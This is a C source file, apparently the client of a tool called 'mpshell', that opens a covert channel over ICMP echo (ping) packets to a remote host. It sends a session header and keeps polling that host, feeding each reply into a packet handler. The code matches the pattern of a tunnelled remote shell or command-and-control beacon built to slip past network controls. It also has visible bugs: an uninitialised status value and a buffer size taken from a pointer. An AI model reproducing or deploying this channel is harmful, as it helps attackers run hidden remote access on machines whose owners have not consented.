#include "mpshell.h"

extern unsigned char *packet_in;
extern unsigned char *packet_out;

extern bool RUN;
extern uint16_t max_payload_size;
extern DWORD sleep_size;
extern DWORD timeout;

int open_icmp_channel(const char *host)
{
    int status;
    ssize_t num_bytes_received;
    unsigned long server_address = inet_addr(host);
    HANDLE handle = IcmpCreateFile();
    if (handle == INVALID_HANDLE_VALUE)
    {
        printf("[ERROR] IcmpCreateFile failed => %d\n", status);
        return EXIT_FAILURE;
    }

    mp_payload_header *header_in        = (mp_payload_header *) packet_in;
    mp_payload_header *header_out       = (mp_payload_header *) packet_out;

    unsigned char *data_in              = (packet_in + sizeof(mp_payload_header));
    unsigned char *data_out             = (packet_out + sizeof(mp_payload_header));

    srand(time(NULL));
    uint16_t random_session_id          = (uint16_t) (1 + rand()%65535);

    header_out->session_id              = htonl(random_session_id);
    header_out->packet_id               = htonl(1);
    header_out->payload_size            = htons(4);

    // First packet contains a payload of 4
    // bytes with the desired max_payload_size
    uint32_t temp = htonl(max_payload_size);
    memcpy(data_out, &temp, 4);

    DWORD reply_size = sizeof(ICMP_ECHO_REPLY32) + sizeof(packet_in);
    LPVOID reply_buffer = (VOID*) malloc(reply_size);
    ZeroMemory(reply_buffer, reply_size);

    while (RUN)
    {
        IcmpSendEcho(
            handle,
            server_address,
            packet_out,
            (PAYLOAD_HEADER_SIZE + ntohs(header_out->payload_size)),
            NULL,
            reply_buffer,
            reply_size,
            timeout
        );

        PICMP_ECHO_REPLY32 current_echo_reply = (PICMP_ECHO_REPLY32)reply_buffer;

        if (current_echo_reply->Status != 0)
        {
            Sleep(sleep_size);
            continue;
        }

        num_bytes_received = current_echo_reply->DataSize;
        memcpy(&packet_in[0], (unsigned char *)current_echo_reply->Data, current_echo_reply->DataSize);
        process_packet(num_bytes_received, header_in, header_out, data_in, data_out);
    }

    IcmpCloseHandle(handle);
    return EXIT_SUCCESS;
}
